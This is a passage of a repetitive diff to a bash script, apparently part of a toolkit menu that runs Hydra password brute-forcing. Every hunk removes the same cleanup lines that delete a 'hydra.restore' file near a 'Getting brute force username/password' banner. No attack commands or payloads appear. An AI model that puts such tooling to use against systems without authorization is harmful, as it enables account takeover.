 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19893,9 +19329,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -19960,9 +19394,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20027,9 +19459,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20094,9 +19524,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20161,9 +19589,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20228,9 +19654,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20295,9 +19719,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20362,9 +19784,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20429,9 +19849,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20496,9 +19914,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20563,9 +19979,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20630,9 +20044,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20697,9 +20109,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20764,9 +20174,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20831,9 +20239,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20897,9 +20303,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -20963,9 +20367,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21030,9 +20432,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21097,9 +20497,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21164,9 +20562,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21231,9 +20627,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21298,9 +20692,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21365,9 +20757,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21432,9 +20822,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21499,9 +20887,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21566,9 +20952,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21634,9 +21018,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -21699,9 +21081,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21765,9 +21145,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21832,9 +21210,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21899,9 +21275,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -21966,9 +21340,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22033,9 +21405,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22100,9 +21470,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22167,9 +21535,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22234,9 +21600,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22301,9 +21665,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22368,9 +21730,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22435,9 +21795,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22502,9 +21860,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22569,9 +21925,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22636,9 +21990,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22703,9 +22055,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22770,9 +22120,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22837,9 +22185,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22903,9 +22249,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -22970,9 +22314,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23037,9 +22379,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23104,9 +22444,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23171,9 +22509,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23238,9 +22574,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23305,9 +22639,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23371,9 +22703,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23438,9 +22768,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23505,9 +22833,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23572,9 +22898,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23639,9 +22963,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23706,9 +23028,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23773,9 +23093,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23840,9 +23158,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23906,9 +23222,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -23973,9 +23287,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24040,9 +23352,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24107,9 +23417,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24174,9 +23482,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24241,9 +23547,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24308,9 +23612,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24375,9 +23677,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24442,9 +23742,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24509,9 +23807,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24576,9 +23872,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24643,9 +23937,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24710,9 +24002,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24777,9 +24067,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24844,9 +24132,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -24911,9 +24197,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 else
@@ -24976,9 +24260,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25043,9 +24325,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25109,9 +24389,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25176,9 +24454,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25243,9 +24519,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25310,9 +24584,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25377,9 +24649,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25444,9 +24714,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25511,9 +24779,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25578,9 +24844,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25645,9 +24909,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25712,9 +24974,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25779,9 +25039,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25846,9 +25104,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25913,9 +25169,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -25980,9 +25234,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26047,9 +25299,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26114,9 +25364,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENUEN
 
@@ -26181,9 +25429,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Getting brute force username/password... "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
